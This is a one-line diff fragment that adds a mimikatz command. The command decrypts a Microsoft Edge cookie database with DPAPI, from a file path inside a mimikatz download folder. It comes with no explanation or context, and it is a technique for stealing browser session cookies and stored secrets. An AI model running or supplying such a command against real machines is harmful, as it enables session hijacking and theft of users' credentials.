@@ -1,0 +1,1 @@
+ dpapi::chrome /in:"D:\Downloads\mimikatz_trunk\x64\AppData\Local\Microsoft\Edge\User Data\Default\Cookies" /unprotect
